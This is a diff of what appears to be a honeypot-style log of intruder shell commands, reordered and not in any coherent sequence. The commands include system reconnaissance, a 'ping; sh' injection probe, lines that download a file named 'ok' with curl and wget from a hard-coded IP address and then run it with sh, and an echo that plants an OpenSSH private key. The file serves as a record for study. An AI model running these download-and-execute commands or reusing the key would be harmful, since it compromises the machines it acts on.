@@ -22,14 +22,8 @@ uname -a
 ping; sh
 /bin/./uname -s -v -n -r -m
 cat /etc/passwd
-cd /tmp
-curl -O http://5.182.210.174/ok
 echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
 id
-rm -rf ok ok.1
-sh ok
-uname -s -m
-wget http://5.182.210.174/ok
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
 AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9
@@ -37,7 +31,13 @@ Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=
 QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 bash
+cd /tmp
 cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
+curl -O http://5.182.210.174/ok
+rm -rf ok ok.1
+sh ok
+uname -s -m
+wget http://5.182.210.174/ok
 echo xsec
 cat /proc/cpuinfo
 /ip cloud print
